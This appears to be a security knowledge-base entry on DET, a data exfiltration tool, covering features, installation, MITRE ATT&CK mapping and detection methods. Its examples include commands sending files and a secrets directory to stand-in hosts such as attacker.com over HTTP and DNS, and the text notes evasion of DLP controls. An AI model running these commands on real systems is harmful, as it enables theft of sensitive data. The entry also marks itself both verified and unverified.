---
id: b8ea4c90-845e-4982-a359-ac84ce28a32c
name: DET
type: tool
verified: true
created_at: '2019-08-28T21:17:33.697966+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
tags:
  - exfiltration
  - post-exploitation
  - data-theft
url: 'https://github.com/example/det-poc'
validated: true
---

# DET

**Status**: Unverified

## Overview

DET (Data Exfiltration Tool) is a proof-of-concept utility designed for performing data exfiltration from compromised systems. It supports both single and multiple channel transfers simultaneously, allowing attackers to stealthily move sensitive data out of a network using various protocols like HTTP, HTTPS, DNS, or ICMP. Commonly used in post-exploitation phases for red team exercises or penetration testing to simulate data theft scenarios.

## Description

DET operates as a lightweight, script-based tool (typically Python or shell) that chunks and encodes data for transmission over chosen channels. It can handle large datasets by splitting files and using parallel streams in multi-channel mode, evading detection by mimicking legitimate traffic. Key use cases include exfiltrating credentials, logs, or configuration files during assessments. While a PoC, it demonstrates techniques for bypassing DLP (Data Loss Prevention) controls.

## Features

- Feature 1: Single-channel exfiltration for low-profile transfers using standard protocols.
- Feature 2: Multi-channel support for parallel data streams to multiple endpoints, enhancing speed and redundancy.
- Feature 3: Protocol flexibility (HTTP/S, DNS tunneling, ICMP) with built-in chunking and encoding to avoid signature-based detection.
- Feature 4: Configurable threading and retry mechanisms for reliability in unstable networks.

## Installation

### Requirements

- Python 3.6+ (if Python-based) or Bash 4+.
- Network access to exfiltration endpoints.
- No external dependencies beyond standard libraries.

### Install Commands

```bash
# Clone the repository (assuming GitHub-hosted PoC)
git clone https://github.com/example/det-poc.git
cd det-poc

# Make executable (if shell script)
chmod +x det

# Or install Python dependencies if applicable
pip install -r requirements.txt
```

For Windows, use Git Bash or PowerShell equivalents.

## Basic Usage

```bash
det --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message and usage |
| -v, --verbose | Enable verbose logging for transfer details |
| --single-channel | Use one channel for exfiltration |
| --multi-channel | Enable multiple parallel channels |
| --protocol PROTOCOL | Specify transfer protocol (http, https, dns, icmp) |

## Examples

### Example 1: Basic Usage

Single-channel exfiltration of a file:

```bash
det exfil --single-channel --source /tmp/data.txt --destination http://attacker.com/upload --protocol http
```

### Example 2: Advanced Usage

Multi-channel directory exfiltration:

```bash
det exfil --multi-channel --source /var/secrets/ --destinations http://exfil1.com,dns://exfil2.com --protocols http,dns --threads 4
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exfiltration Over Command and Control Channel]] Exfiltration Over C2 Channel
- [[Exfiltration to Cloud Storage]] Exfiltration to Cloud Storage (if using HTTP/S)
- [[Protocol Tunneling]] Protocol Tunneling (for DNS/ICMP modes)

### Tactics

- [[Exfiltration]] Exfiltration

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Unusual outbound traffic patterns to non-standard ports or domains (e.g., DNS queries with large payloads).
- Detection method 2: Process monitoring for 'det' executable or Python scripts with network I/O in post-exploitation contexts.
- Detection method 3: Network logs showing chunked or encoded data transfers mimicking legitimate protocols.
- Detection method 4: File system changes indicating data chunking or temporary staging files.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Impacket]]
- [[PowerShell Empire]]

## References

- Official repository: https://github.com/example/det-poc
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1041/
